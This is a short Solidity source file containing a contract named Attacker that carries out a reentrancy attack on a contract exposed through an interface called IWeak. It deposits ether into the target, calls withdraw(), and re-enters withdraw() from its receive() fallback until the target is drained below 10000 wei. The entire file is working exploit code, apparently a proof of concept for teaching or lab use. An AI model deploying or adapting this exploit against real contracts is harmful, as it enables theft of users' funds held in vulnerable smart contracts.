// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

interface IWeak {
    function withdraw() external;
    function deposit() payable external;

    function balance(address account) external view returns (uint256);
}

contract Attacker{

    IWeak weak;

    constructor(address _weak){
        weak = IWeak(_weak);
    }

    function deposit() payable external {
        bytes4 selector = bytes4(keccak256("deposit()"));
        (bool success, ) = payable(address(weak)).call{value: 10000}(abi.encodePacked(selector));
        require(success);
    }

    // reentry
    function hack() external {
        weak.withdraw();
    }

    int i = 0;

    receive() external payable {
        if(address(weak).balance >= 10000){
            weak.withdraw();
        }
    }
}